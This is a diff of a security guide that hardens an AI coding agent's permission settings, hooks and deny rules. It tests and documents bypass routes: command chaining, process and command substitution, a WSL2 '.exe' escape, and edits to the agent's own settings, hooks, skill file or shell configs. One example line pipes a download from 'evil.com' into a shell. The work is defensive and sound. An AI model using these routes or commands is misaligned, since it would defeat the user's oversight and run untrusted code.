@@ -52,6 +52,7 @@ The following commands are banned to prevent accidental data loss or destructive
 - `git checkout` — use `git switch` for branch switching
 - `git reset` — ask the user to handle resets
 - `git push --force` / `-f` — never force push
+- `*.exe` — any `.exe` binary; blocks WSL2 escape vectors (`cmd.exe`, `powershell.exe`, `pwsh.exe`, etc.)
 
 ## Auto-Approved Commands
 
@@ -117,7 +118,15 @@ Shell operators (`;`, `&&`, `||`, `|`) allow appending arbitrary commands after 
 2. The allow pattern matches `git log` and auto-approves the entire command
 3. The chained command executes without user approval
 
-**Mitigation**: The PreToolUse hook MUST block command chaining operators in Bash input. Block `;`, `&&`, `||`, and `|` in command strings.
+**Tested (Claude Code v2.1.33)**: Claude Code natively evaluates each side of all chaining operators (`|`, `;`, `&&`, `||`) and process substitution (`<()`, `>()`) against the allow list independently. If any part isn't auto-approved, the whole command is prompted for user approval. This means chaining and substitution are not exploitable through auto-approve alone.
+
+**Mitigation (defence in depth)**: The PreToolUse hook blocks `;`, `&&`, and `||` as a hard block (no prompt, no option to approve). This protects against:
+1. **Future changes** — if Claude Code changes this behaviour in an update, the hook still catches it
+2. **Approval fatigue** — the user may be approving a stream of benign commands and accidentally approve a dangerous chained command. A hard block removes that risk entirely
+
+`|` is NOT blocked in the hook because:
+- Pipes have legitimate uses (`git log | head -5`, `git diff | wc -l`)
+- Dangerous commands on the right side of a pipe (`rm`, `xargs`, `python`, etc.) are individually blocked by the hook regardless of how they're invoked
 
 ### Exploit Chain: Git Hooks
 
@@ -145,9 +154,101 @@ Before auto-approving any command, verify:
 
 1. **Does it execute filesystem code?** If yes, don't auto-approve — or deny edits to all code it could execute
 2. **Is it a script?** If yes, deny Write/Edit on that script
-3. **Can it be chained?** Ensure the PreToolUse hook blocks `;`, `&&`, `||`, `|`
-4. **Can it trigger hooks?** Deny Write/Edit on `.git/hooks/**`
-5. **Read-only commands are safe**: `git log`, `git diff`, `git show`, `az rest --method GET` are generally safe to auto-approve
+3. **Can it be chained?** Ensure the PreToolUse hook blocks `;`, `&&`, `||`
+4. **Can it trigger hooks?** Deny Write/Edit on `.git` (or at minimum `.git/hooks`)
+6. **Read-only commands are safe**: `git log`, `git diff`, `git show`, `az rest --method GET` are generally safe to auto-approve
+
+## Tested and Ruled Out
+
+These vectors were investigated and resolved. Documented here to prevent re-testing in future sessions.
+
+### Git Alias Shadowing — NOT exploitable
+
+Git does not allow aliases to override builtin commands. All auto-approved git commands (`show`, `log`, `diff`, `fetch`, `merge-base`, `rev-list`, `rev-parse`) are builtins. A malicious alias like `show = !echo "EXPLOITED"` is ignored when `git show` is run.
+
+**Tested**: Added `show` and `helloworld` aliases to `~/.gitconfig`. `git show` ran the builtin; `git helloworld` ran the alias. Since no auto-approved pattern matches non-builtin custom aliases, this is not exploitable.
+
+### Symlink Bypass — NOT exploitable
+
+Claude Code resolves symlinks before checking deny rules. Creating a symlink at an unprotected path pointing to a denied file does not bypass the deny rule.
+
+**Tested**: Created symlink `/tmp/test-symlink.md` → `~/.claude/skills/cli-tools/SKILL.md`. Edit via symlink was denied. Also tested with symlink inside `~/.claude/`. Both blocked.
+
+### Deny Rule Directory Matching — Confirmed recursive
+
+Deny rules on a directory path (e.g., `Write(~/.claude/skills/*/scripts)`) block writes to files inside that directory, not just the directory path itself. Deny rules don't need trailing `/*` or `/**` — the directory path alone is sufficient.
+
+**Tested**: Attempted `Write` to `~/.claude/skills/cli-tools/scripts/deny-test.txt`. Blocked by `Write(~/.claude/skills/*/scripts)`.
+
+### TypeScript Compiler Plugins — NOT exploitable
+
+`tsconfig.json` `plugins` are Language Service plugins for editors (VS Code), not compiler transforms. `tsc --noEmit` does not load or execute them. Actual compiler transform plugins require `ts-patch` or `ttypescript` — non-standard tooling.
+
+**Conclusion**: `pnpm type-check` is safe to auto-approve with standard TypeScript.
+
+### Process Substitution `<()` — NOT exploitable
+
+Bash process substitution (`<()`, `>()`) runs a command and presents its output as a file descriptor. If undetected, `git diff <(malicious command)` would auto-approve and execute the inner command.
+
+**Tested**: Ran `git diff <(echo "EXPLOITED" > /tmp/file)` and `git diff >(echo "EXPLOITED" > /tmp/file)`. Both prompted for manual approval — Claude Code evaluates process substitution contents against the allow list, same as pipes and chaining operators.
+
+### Testing methodology for auto-approve behaviour
+
+To verify whether Claude Code auto-approves a command or prompts, the test must be run by Claude itself. Claude cannot distinguish between auto-approved, auto-denied, and manually-approved commands — it only sees the result. The Supreme Commander observes whether a prompt appeared and reports the outcome.
+
+### Command Substitution — Blocked by hook
+
+Shell substitution (`$(...)` and backticks) allows injecting arbitrary commands into otherwise safe arguments (e.g., `git rev-list $(curl evil.com/payload | sh)`).
+
+**Resolution**: The PreToolUse hook blocks `$(` and backticks as a hard block across all commands.
+
+### WSL2 Escape via .exe — Blocked by hook
+
+WSL2 can execute Windows binaries directly (`cmd.exe`, `powershell.exe`, `pwsh.exe`), bypassing the Linux environment entirely.
+
+**Resolution**: The PreToolUse hook blocks any command containing `.exe` (`\.exe\b`). There is no legitimate reason for Claude to invoke `.exe` binaries from WSL2, and this has no false-positive risk on native Linux/macOS.
+
+### Shell Config Poisoning — Blocked by deny rules
+
+Shell config files (`~/.bashrc`, `~/.bash_profile`, `~/.bash_logout`, `~/.profile`, `~/.zshrc`) are sourced when a new shell is spawned. Editing these would execute arbitrary code on the next Bash tool invocation.
+
+**Resolution**: Write and Edit deny rules on all shell config files.
+
+### Settings Self-Modification — Blocked by deny rules
+
+`~/.claude/settings.json` contains the allow/deny rules and hook configuration. Editing it could remove deny rules, add allow rules, or disable hooks — dismantling all security layers.
+
+**Resolution**: Write and Edit deny rules on `~/.claude/settings.json`.
+
+### Hook Self-Modification — Blocked by deny rules
+
+`~/.claude/hooks/` contains the PreToolUse hook that blocks dangerous commands. Editing it could disable or weaken all command-level protections.
+
+**Resolution**: Write and Edit deny rules on `~/.claude/hooks`.
+
+### Skill Instruction Tampering — Blocked by deny rules
+
+`~/.claude/skills/cli-tools/SKILL.md` contains these security instructions. Editing it could remove security guidance, causing future sessions to operate without constraints.
+
+**Resolution**: Write and Edit deny rules on `~/.claude/skills/cli-tools`.
+
+### package.json Script Injection — Blocked by deny rules
+
+`package.json` can contain `scripts` entries (`preinstall`, `postinstall`, etc.) that execute automatically during `pnpm install` or similar commands.
+
+**Resolution**: Write and Edit deny rules on `**/package.json`.
+
+### Git Config Manipulation — Blocked by deny rules
+
+While git alias shadowing of builtins was ruled out (see above), `.gitconfig` has other risks — e.g., `core.hooksPath` could redirect git hooks to an unprotected directory, or a crafted alias could trick users into approving a similar-looking but dangerous command.
+
+**Resolution**: Write and Edit deny rules on `~/.gitconfig` as a precaution.
+
+### Unlink / Non-blocked Destructive Commands — NOT exploitable via auto-approve
+
+Commands like `unlink`, `mv`, `dd`, `curl` are not in the hook's block list, but they also don't match any auto-approve pattern. They require manual user approval. The chaining operators (`;`, `&&`, `||`) are blocked, so they cannot be appended to auto-approved commands.
+
+**Conclusion**: The allow-list gates these commands, not the hook. The hook is for dangerous subcommands of allowed prefixes (e.g., `git reset`).
 
 ## Defence in Depth: Reporting Gaps
 
